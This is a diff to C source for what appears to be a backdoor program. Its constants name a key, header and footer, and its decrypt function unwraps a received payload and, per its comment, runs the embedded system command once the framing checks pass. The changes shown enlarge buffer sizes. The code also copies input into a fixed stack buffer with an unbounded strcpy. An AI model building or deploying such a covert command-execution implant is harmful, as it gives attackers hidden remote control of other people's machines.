@@ -10,11 +10,12 @@
 #define BD_HEADER       "0bBH%iKU"
 #define BD_FOOTER       "5@lbJKXK"*/
 
-#define BD_KEY          "keyyyyyy"
-#define BD_HEADER       "headerrr"
-#define BD_FOOTER       "footerrr"
-#define BD_KEY_LEN      8
-#define BD_MAX_MSG_LEN  1024
+#define BD_KEY              "keyyyyyy"
+#define BD_HEADER           "headerrr"
+#define BD_FOOTER           "footerrr"
+#define BD_KEY_LEN          8
+#define BD_MAX_MSG_LEN      1024
+#define BD_MAX_REPLY_LEN    4096
 
 /*
 | ------------------------------------------------------------------------------
@@ -77,8 +78,8 @@ char *decrypt(char *payload){
     printf("Decrypt payload: %s\n",payload);
     /* Copy only encrypted portion of the payload to message */
     
-    char message[BD_MAX_MSG_LEN];
-    memset(message, 0, BD_MAX_MSG_LEN);
+    char message[BD_MAX_REPLY_LEN];
+    memset(message, 0, BD_MAX_REPLY_LEN);
     strcpy(message, payload + BD_KEY_LEN);
     printf("Message: %s\n", message);
     
@@ -102,8 +103,8 @@ char *decrypt(char *payload){
     /* All checks successful, run the system command */
     
     // Parse command
-    char *bd_command = malloc(BD_MAX_MSG_LEN);
-    memset(bd_command, 0, BD_MAX_MSG_LEN);
+    char *bd_command = malloc(BD_MAX_REPLY_LEN);
+    memset(bd_command, 0, BD_MAX_REPLY_LEN);
     strncpy(bd_command, \
         (message + BD_KEY_LEN), \
         strlen(message) - (2 * BD_KEY_LEN));
